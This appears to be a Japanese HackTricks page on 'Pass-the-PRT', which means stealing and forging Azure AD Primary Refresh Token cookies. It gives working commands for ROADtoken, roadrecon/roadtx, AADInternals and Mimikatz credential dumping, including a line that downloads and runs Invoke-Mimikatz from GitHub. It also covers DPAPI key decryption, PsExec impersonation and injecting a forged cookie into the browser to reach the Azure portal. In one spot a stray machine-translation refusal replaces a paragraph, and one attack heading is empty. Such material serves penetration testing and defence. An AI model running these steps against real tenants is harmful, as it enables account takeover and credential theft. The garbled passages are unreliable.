# Az - Pass the PRT

{{#include ../../../banners/hacktricks-training.md}}

## PRTとは何か

{{#ref}}
az-primary-refresh-token-prt.md
{{#endref}}

### PRTがあるか確認する
```
Dsregcmd.exe /status
```
SSOステートセクションでは、**`AzureAdPrt`**が**YES**に設定されているのが見えるはずです。

<figure><img src="../../../images/image (140).png" alt=""><figcaption></figcaption></figure>

同じ出力で、**デバイスがAzureに参加しているか**（フィールド`AzureAdJoined`で）も確認できます：

<figure><img src="../../../images/image (135).png" alt=""><figcaption></figcaption></figure>

## PRTクッキー

PRTクッキーは実際には**`x-ms-RefreshTokenCredential`**と呼ばれ、JSON Web Token（JWT）です。JWTは**3つの部分**、**ヘッダー**、**ペイロード**、および**署名**で構成され、`.`で区切られ、すべてURLセーフなbase64でエンコードされています。典型的なPRTクッキーは以下のヘッダーとボディを含みます：
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
実際の **Primary Refresh Token (PRT)** は **`refresh_token`** 内にカプセル化されており、これは Azure AD の制御下にあるキーによって暗号化されているため、その内容は私たちには不透明で復号不可能です。フィールド **`is_primary`** は、このトークン内にプライマリリフレッシュトークンがカプセル化されていることを示します。クッキーが意図された特定のログインセッションにバインドされ続けることを保証するために、`request_nonce` が `logon.microsoftonline.com` ページから送信されます。

### TPMを使用したPRTクッキーのフロー

**LSASS** プロセスは **KDFコンテキスト** を TPM に送信し、TPM は **セッションキー**（デバイスが AzureAD に登録されたときに収集され、TPM に保存されたもの）と前のコンテキストを使用して **キーを導出** し、この **導出されたキー** が **PRTクッキー (JWT) を署名するために使用されます。**

**KDFコンテキストは** AzureAD からのノンスと PRT を混ぜた **JWT** で、**コンテキスト**（ランダムバイト）を含みます。

したがって、PRT が TPM 内にあるために抽出できない場合でも、LSASS を悪用して **新しいコンテキストから導出されたキーを要求し、生成されたキーを使用してクッキーに署名する** ことが可能です。

<figure><img src="../../../images/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT悪用シナリオ

**通常のユーザー** として、LSASS に SSO データを要求することで **PRTの使用を要求する** ことが可能です。\
これは、**Web Account Manager**（トークンブローカー）からトークンを要求する **ネイティブアプリ** のように行うことができます。WAM はリクエストを **LSASS** に渡し、LSASS は署名された PRT アサーションを使用してトークンを要求します。また、**PRTクッキー** が Azure AS ログインページへのリクエストを認証するための **ヘッダー** として使用される **ブラウザベース（ウェブ）フロー** でも行うことができます。

**SYSTEM** として、TPM によって保護されていない場合は **PRTを盗むことができ**、または **LSASS 内のPRTキーと相互作用する** ことができます。

## Pass-the-PRT攻撃の例

### 攻撃 - ROADtoken

この方法の詳細については [**この投稿を確認してください**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)。ROADtoken は正しいディレクトリから **`BrowserCore.exe`** を実行し、これを使用して **PRTクッキーを取得** します。このクッキーはその後、ROADtools を使用して認証し、**永続的なリフレッシュトークンを取得** するために使用できます。

有効な PRT クッキーを生成するために最初に必要なのはノンスです。\
これを取得するには:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
[**roadrecon**](https://github.com/dirkjanm/ROADtools)を使用するか：
```powershell
roadrecon auth prt-init
```
その後、[**roadtoken**](https://github.com/dirkjanm/ROADtoken)を使用して新しいPRTを取得できます（攻撃するユーザーのプロセスからツールを実行します）：
```powershell
.\ROADtoken.exe <nonce>
```
申し訳ありませんが、具体的なテキストが提供されていないため、翻訳を行うことができません。翻訳が必要なテキストを提供してください。
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
次に、**生成されたクッキー**を使用して、Azure AD **Graph**またはMicrosoft Graphを使用して**トークン**を**生成**して**ログイン**できます：
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### 攻撃 - roadreconの使用

### 攻撃 - AADInternalsと漏洩したPRTの使用

`Get-AADIntUserPRTToken` **ユーザーのPRTトークンを取得します** Azure ADに参加したコンピュータまたはハイブリッド参加したコンピュータから。 `BrowserCore.exe`を使用してPRTトークンを取得します。
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Mimikatzからの値がある場合は、AADInternalsを使用してトークンを生成することもできます:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com) に移動し、login.microsoftonline.com のすべてのクッキーをクリアし、新しいクッキーを入力します。
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
次に、[https://portal.azure.com](https://portal.azure.com)に移動します。

> [!CAUTION]
> 残りはデフォルトのはずです。ページを更新でき、クッキーが消えないことを確認してください。消えた場合は、間違いを犯した可能性があり、プロセスを再度実行する必要があります。消えない場合は、問題ありません。

### 攻撃 - Mimikatz

#### ステップ

1. **PRT（プライマリリフレッシュトークン）がLSASS（ローカルセキュリティオーソリティサブシステムサービス）から抽出され、後で使用するために保存されます。**
2. **次にセッションキーが抽出されます。** このキーは最初に発行され、その後ローカルデバイスによって再暗号化されるため、DPAPIマスタキーを使用して復号化する必要があります。DPAPI（データ保護API）に関する詳細情報は、これらのリソースで確認できます: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) およびその適用については、[Pass-the-cookie attack](az-pass-the-cookie.md)を参照してください。
3. セッションキーの復号化後、**PRTのための派生キーとコンテキストが取得されます。** これらは**PRTクッキーの作成に重要です。** 特に、派生キーはクッキーを構成するJWT（JSON Webトークン）に署名するために使用されます。このプロセスの詳細な説明はDirk-janによって提供されており、[こちら](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)でアクセスできます。

> [!CAUTION]
> PRTがTPM内にあり、`lsass`内にない場合、**mimikatzはそれを抽出できません。**\
> ただし、TPMからのコンテキストから派生キーを取得し、それを使用して**クッキーに署名することは可能です（オプション3を確認してください）。**

これらの詳細を抽出するために実行されたプロセスの**詳細な説明**は、こちらにあります: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

> [!WARNING]
> これは、2021年8月の修正後、他のユーザーのPRTトークンを取得するためには正確には機能しません。なぜなら、ユーザーのみが自分のPRTを取得できるからです（ローカル管理者は他のユーザーのPRTにアクセスできません）が、自分のPRTにはアクセスできます。

**mimikatz**を使用してPRTを抽出できます:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../images/image (251).png" alt=""><figcaption></figcaption></figure>

**Prt**とラベル付けされた部分を**コピー**して保存します。\
また、下にハイライトされている**`ProofOfPossesionKey`**フィールドの**`KeyValue`**であるセッションキーも抽出します。これは暗号化されており、復号化するためにDPAPIマスタキーを使用する必要があります。

<figure><img src="../../../images/image (182).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> PRTデータが表示されない場合、デバイスがAzure ADに参加していないために**PRTがない**か、**古いバージョン**のWindows 10を実行している可能性があります。

セッションキーを**復号化**するには、**SYSTEM**権限に**昇格**してコンピュータコンテキストで実行し、**DPAPIマスタキーを使用して復号化**できるようにする必要があります。次のコマンドを使用して実行できます:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../images/image (183).png" alt=""><figcaption></figcaption></figure>

#### オプション 1 - フル Mimikatz

- 現在、両方のコンテキスト値をコピーしたいです:

<figure><img src="../../../images/image (210).png" alt=""><figcaption></figcaption></figure>

- そして派生キー値を:

<figure><img src="../../../images/image (150).png" alt=""><figcaption></figcaption></figure>

- 最後に、これらの情報を使用して**PRTクッキーを生成**できます:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../images/image (282).png" alt=""><figcaption></figcaption></figure>

- [https://login.microsoftonline.com](https://login.microsoftonline.com) に移動し、login.microsoftonline.com のすべてのクッキーをクリアして、新しいクッキーを入力します。
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
- 次に [https://portal.azure.com](https://portal.azure.com) に移動します。

> [!CAUTION]
> 残りはデフォルトのままであるべきです。ページを更新でき、クッキーが消えないことを確認してください。消える場合は、間違いを犯した可能性があり、プロセスを再度行う必要があります。消えない場合は、大丈夫です。

#### オプション 2 - PRTを使用したroadrecon

- まずPRTを更新し、`roadtx.prt`に保存します：
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
- これで、`roadtx browserprtauth`を使用してインタラクティブブラウザで**トークンを要求**できます。`roadtx describe`コマンドを使用すると、アクセス トークンに MFA クレームが含まれていることがわかります。これは、今回使用した PRT にも MFA クレームが含まれていたためです。
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

#### オプション 3 - derived keys を使用した roadrecon

コンテキストと mimikatz によってダンプされた derived key があれば、roadrecon を使用して新しい署名付きクッキーを生成することが可能です:
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
## 参考文献

- [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
- [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [https://www.youtube.com/watch?v=x609c-MUZ_g](https://www.youtube.com/watch?v=x609c-MUZ_g)

{{#include ../../../banners/hacktricks-training.md}}
